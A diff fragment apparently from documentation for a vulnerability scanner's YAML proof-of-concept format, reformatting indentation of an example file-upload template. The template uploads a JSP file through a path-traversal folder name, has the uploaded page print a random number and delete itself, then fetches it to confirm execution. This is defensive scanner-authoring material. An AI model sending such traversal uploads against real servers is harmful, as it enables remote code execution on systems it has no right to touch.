@@ -9,36 +9,36 @@ name: poc-yaml-test-upload-cve-xxx-xxxx
 manual: true
 transport: http
 set:
-	s1: randomInt(1000000000, 9000000000)
-	s2: randomLowercase(20)
-	rBoundary: randomLowercase(8)
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(20)
+    rBoundary: randomLowercase(8)
 rules:
-	r0:
-		request:
-			cache: true
-			method: POST
-			path: /UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename={{s2}}.jsp
-			body: "\
-				------WebKitFormBoundary{{rBoundary}}\r\n\
-				Content-Disposition: form-data; name=\"myFile\"; filename=\"test.jpg\"\r\n\
-				\r\n\
-				<% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
-				------WebKitFormBoundary{{rBoundary}}--\r\n\
-				"
-			headers:
-				Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
-		expression: response.status == 200 && response.body.bcontains(b"showSucceedMsg")
-	r1:
-		request:
-			cache: true
-			method: GET
-			path: /xxxPath/{{s2}}.jsp
-		expression: response.status == 200 && response.body.bcontains(bytes(string(s1)))
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename={{s2}}.jsp
+            body: "\
+                ------WebKitFormBoundary{{rBoundary}}\r\n\
+                Content-Disposition: form-data; name=\"myFile\"; filename=\"test.jpg\"\r\n\
+                \r\n\
+                <% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+                ------WebKitFormBoundary{{rBoundary}}--\r\n\
+                "
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        expression: response.status == 200 && response.body.bcontains(b"showSucceedMsg")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /xxxPath/{{s2}}.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s1)))
 expression: r0() && r1()
 detail:
-	author: chaitin
-	links:
-		- http://example.com
+    author: chaitin
+    links:
+        - http://example.com
 ```
 
 这里给出一个对于file-upload漏洞的范例，也许不同漏洞的文件上传之间互有差异，但是大体上我们需要符合以下几点规则
